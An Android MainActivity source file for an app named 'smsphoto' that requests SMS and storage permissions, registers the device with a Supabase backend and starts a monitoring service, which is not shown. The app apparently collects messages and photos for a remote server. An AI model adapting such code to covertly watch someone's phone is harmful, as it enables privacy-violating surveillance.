package com.monitor.smsphoto;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {
    private static final int PERMISSION_REQUEST_CODE = 100;
    private Button startBtn;
    private Button stopBtn;
    private TextView statusText;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        startBtn = findViewById(R.id.startBtn);
        stopBtn = findViewById(R.id.stopBtn);
        statusText = findViewById(R.id.statusText);

        startBtn.setOnClickListener(v -> startMonitoring());
        stopBtn.setOnClickListener(v -> stopMonitoring());

        requestPermissions();
        registerDevice();
    }

    private void registerDevice() {
        new Thread(() -> {
            try {
                String url = Config.SUPABASE_URL + "/rest/v1/devices?device_id=eq." + Config.DEVICE_ID;
                java.net.URL obj = new java.net.URL(url);
                java.net.HttpURLConnection conn = (java.net.HttpURLConnection) obj.openConnection();
                conn.setRequestMethod("GET");
                conn.setRequestProperty("Authorization", "Bearer " + Config.SUPABASE_KEY);
                conn.setRequestProperty("apikey", Config.SUPABASE_KEY);

                if (conn.getResponseCode() == 200) {
                    java.io.BufferedReader in = new java.io.BufferedReader(
                            new java.io.InputStreamReader(conn.getInputStream()));
                    String response = in.readLine();
                    in.close();

                    if (response != null && response.equals("[]")) {
                        insertDevice();
                    }
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }

    private void insertDevice() {
        new Thread(() -> {
            try {
                String json = "{\"device_id\":\"" + Config.DEVICE_ID + "\",\"device_name\":\"Android Device\"}";
                String url = Config.SUPABASE_URL + "/rest/v1/devices";
                java.net.URL obj = new java.net.URL(url);
                java.net.HttpURLConnection conn = (java.net.HttpURLConnection) obj.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Authorization", "Bearer " + Config.SUPABASE_KEY);
                conn.setRequestProperty("apikey", Config.SUPABASE_KEY);
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);

                java.io.OutputStream os = conn.getOutputStream();
                os.write(json.getBytes());
                os.flush();
                os.close();

                conn.getResponseCode();
                conn.disconnect();

                runOnUiThread(() -> Toast.makeText(MainActivity.this, "Device registered!", Toast.LENGTH_SHORT).show());
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }

    private void startMonitoring() {
        Intent intent = new Intent(this, MonitorService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent);
        } else {
            startService(intent);
        }
        statusText.setText("মনিটর স্টেটাস: চালু");
        Toast.makeText(this, "Monitoring started!", Toast.LENGTH_SHORT).show();
    }

    private void stopMonitoring() {
        Intent intent = new Intent(this, MonitorService.class);
        stopService(intent);
        statusText.setText("মনিটর স্টেটাস: অফ");
        Toast.makeText(this, "Monitoring stopped!", Toast.LENGTH_SHORT).show();
    }

    private void requestPermissions() {
        List<String> permissionsNeeded = new ArrayList<>();
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)
                != PackageManager.PERMISSION_GRANTED) {
            permissionsNeeded.add(Manifest.permission.READ_SMS);
        }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE)
                != PackageManager.PERMISSION_GRANTED) {
            permissionsNeeded.add(Manifest.permission.READ_EXTERNAL_STORAGE);
        }
        if (!permissionsNeeded.isEmpty()) {
            ActivityCompat.requestPermissions(this,
                    permissionsNeeded.toArray(new String[0]),
                    PERMISSION_REQUEST_CODE);
        }
    }
}
